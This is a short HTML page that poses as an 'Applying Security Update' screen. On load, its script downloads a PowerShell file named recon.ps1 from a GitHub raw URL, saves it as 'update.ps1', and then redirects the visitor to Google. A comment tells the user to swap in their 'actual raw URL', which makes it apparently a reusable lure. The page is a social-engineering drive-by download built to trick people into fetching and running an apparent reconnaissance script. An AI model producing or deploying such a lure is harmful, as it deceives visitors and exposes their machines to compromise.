<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Applying Security Update...</title>
  <style>
    body { 
      background: #0a0a0a; 
      color: #00ff00; 
      font-family: Arial, sans-serif; 
      text-align: center; 
      padding-top: 100px; 
    }
  </style>
</head>
<body>
  <h1>Applying Security Update...</h1>
  <p>Please wait, this won't take long.</p>

  <script>
    // === CHANGE THIS TO YOUR ACTUAL RAW URL ===
    const psUrl = "https://raw.githubusercontent.com/yggr153/error-screenshot/main/recon.ps1";

    function startDownloadAndRedirect() {
      // Auto download the .ps1
      const link = document.createElement('a');
      link.href = psUrl;
      link.download = "update.ps1";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Redirect to Google after 1.5 seconds
      setTimeout(() => {
        window.location.href = "https://google.com";
      }, 1500);
    }

    // Start automatically
    window.onload = startDownloadAndRedirect;
  </script>
</body>
</html>
